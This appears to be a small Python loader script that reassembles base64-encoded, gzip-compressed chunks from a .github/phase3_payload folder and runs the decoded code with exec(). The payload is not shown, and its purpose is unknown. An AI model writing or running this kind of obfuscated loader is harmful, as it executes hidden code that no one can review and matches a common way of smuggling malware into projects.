from pathlib import Path
import base64
import gzip

root = Path(__file__).resolve().parents[2]
payload_dir = root / ".github" / "phase3_payload"
payload = "".join(
    path.read_text(encoding="utf-8").strip()
    for path in sorted(payload_dir.glob("phase3_payload_*.txt"))
)
source = gzip.decompress(base64.b64decode(payload)).decode("utf-8")
exec(compile(source, str(Path(__file__)), "exec"), {
    "__file__": str(Path(__file__)),
    "__name__": "__main__",
})
